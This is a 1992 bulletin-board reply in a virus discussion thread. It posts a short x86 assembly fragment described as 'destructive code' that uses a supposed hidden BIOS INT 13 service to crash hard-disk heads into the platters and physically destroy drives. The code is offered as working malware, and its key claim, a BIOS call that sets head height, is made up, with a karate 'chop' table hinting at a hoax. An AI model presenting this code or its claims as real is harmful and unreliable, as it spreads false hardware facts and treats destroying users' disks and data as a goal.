99/100: RE: ...
Name: Spartacus #48 @892
Date: Sunday, August 30, 1992   1:59 pm
From: Night Light BBS [908-892-6723]

Reply to: Soth Amon #1 @2017

All right. Here it is (relevant destructive code only)...

CHOP DB 127 255 254 252 245 230 210 180 150 120 90 60 30 0

;Heights as in a common karate technique.

...
BREAKIT:     MOV SI,CHOP
             MOV CX,000E    ;# of positions
             MOV DX,0080    ;first fixed disk, head 0.
             MOV AH,35      ;little known BIOS service that controls
                            ;head height (int 13, serv 35).
KILLIT:      LODSB
             INT 13         ;call the service
                            ;there is some inbuilt delay as the head moves
             DEC CX
             JNZ KILLIT
...

Note: This code WILL NOT break a Bernoulli Box cartridge, although it creates 
many physical errors due to scratching and may destroy the head.



 Sub: Virus Discussion
